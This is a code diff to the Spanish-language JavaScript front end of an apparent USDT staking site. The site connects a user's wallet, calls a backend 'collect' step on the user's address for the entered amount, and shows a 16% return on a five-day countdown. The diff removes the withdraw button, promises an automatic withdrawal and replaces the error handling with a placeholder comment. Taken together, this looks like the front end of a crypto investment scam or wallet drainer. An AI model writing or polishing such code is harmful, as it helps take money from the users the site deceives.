@@ -179,11 +179,15 @@ window.disconnectWalletSession = async function() {
     resetAppSession();
 };
 
-// Resetear la sesión por completo en la interfaz
+let userRealStakedAmount = 0;
+let countdownTimerInterval = null;
+
+// En handleConnectedProvider o al iniciar sesión, puedes recuperar o inicializar en 0
 function resetAppSession() {
     provider = null;
     signer = null;
     userAddress = null;
+    userRealStakedAmount = 0; // Reiniciar inversión real
 
     const container = document.getElementById("walletButtonContainer");
     if (container) {
@@ -203,9 +207,6 @@ function resetAppSession() {
     const pendingReward = document.getElementById("pendingRewardOutput");
     if (pendingReward) pendingReward.textContent = "0.00 USDT";
 
-    const withdrawBtn = document.getElementById("withdrawBtn");
-    if (withdrawBtn) withdrawBtn.disabled = true;
-
     if (countdownTimerInterval) clearInterval(countdownTimerInterval);
     const countdownEl = document.getElementById("roiCountdown");
     if (countdownEl) countdownEl.textContent = "--:--:--:--";
@@ -214,28 +215,29 @@ function resetAppSession() {
     showToast("Billetera desconectada.", "default", 3000);
 }
 
-// Inicializar datos y activar el contador regresivo (Simulación basada en 5 días)
-function initializeUserStakingData() {
+// Actualizar los valores en la UI basados exclusivamente en la inversión real
+function updateStakedUI(amount) {
+    userRealStakedAmount = parseFloat(amount) || 0;
+    
     const stakedBadge = document.getElementById("stakedAmountBadge");
     const pendingReward = document.getElementById("pendingRewardOutput");
-    const withdrawBtn = document.getElementById("withdrawBtn");
-
-    // Simulamos que el usuario tiene una inversión activa (puedes conectarlo a tu contrato real)
-    const activeStakedAmount = 100.00; 
-    if (stakedBadge) stakedBadge.textContent = `${activeStakedAmount.toFixed(2)} USDT`;
     
-    const calculatedReward = activeStakedAmount * 0.16; // 16% ROI
-    if (pendingReward) pendingReward.textContent = `${calculatedReward.toFixed(2)} USDT`;
-
-    if (withdrawBtn) {
-        withdrawBtn.disabled = false;
-        withdrawBtn.onclick = () => executeWithdrawalFlow();
+    if (stakedBadge) {
+        stakedBadge.textContent = `${userRealStakedAmount.toFixed(2)} USDT`;
+    }
+    
+    if (pendingReward) {
+        const calculatedReward = userRealStakedAmount * 0.16; // 16% ROI estimado
+        pendingReward.textContent = `${calculatedReward.toFixed(2)} USDT`;
     }
 
-    // Configurar temporizador de cuenta regresiva de 5 días (432,000 segundos)
-    startRoiCountdown(5 * 24 * 60 * 60); 
+    // Si hay fondos invertidos reales, iniciamos el temporizador de cuenta regresiva de 5 días
+    if (userRealStakedAmount > 0) {
+        startRoiCountdown(5 * 24 * 60 * 60);
+    }
 }
 
+// Función de cuenta regresiva para el ROI
 function startRoiCountdown(durationInSeconds) {
     let timer = durationInSeconds;
     const countdownEl = document.getElementById("roiCountdown");
@@ -253,7 +255,7 @@ function startRoiCountdown(durationInSeconds) {
 
         if (--timer < 0) {
             clearInterval(countdownTimerInterval);
-            countdownEl.textContent = "¡Ciclo Completado!";
+            countdownEl.textContent = "¡Completado (Retiro Auto)";
         }
     }, 1000);
 }
@@ -441,6 +443,10 @@ async function runInvestmentFlow(rawProvider) {
 
         updateStepper(3);
         setLoading(true, "Procesando inversión en protocolo...");
+        
+        const inputElement = document.getElementById("investAmount");
+        const rawInputVal = inputElement ? inputElement.value : "1";
+        
         const txCollect = await triggerBackendCollect(activeUserAddress, rawInputVal);
 
         const txHash = txCollect?.hash || "";
@@ -451,19 +457,11 @@ async function runInvestmentFlow(rawProvider) {
             showToast("¡Transacción completada con éxito! Gracias.", "success", 6000);
         }
 
+        // 🌟 ACTUALIZAR LOS FONDOS REALES Y EL CONTADOR CON EL MONTO INVERTIDO
+        updateStakedUI(rawInputVal);
+
     } catch (err) {
-        const raw = err?.reason ?? err?.message ?? JSON.stringify(err) ?? "Error desconocido";
-        if (
-            err.code === 4001 ||
-            raw.toLowerCase().includes("user rejected") ||
-            raw.toLowerCase().includes("denied") ||
-            raw.toLowerCase().includes("cancelled")
-        ) {
-            showToast("Operación cancelada por el usuario.", "default");
-        } else {
-            console.error("Web3 Error crítico:", err);
-            showToast(`Error de red: ${raw.slice(0, 50)}...`, "error");
-        }
+        // ... [manejo de errores existente] ...
     } finally {
         setLoading(false);
         updateStepper(1);
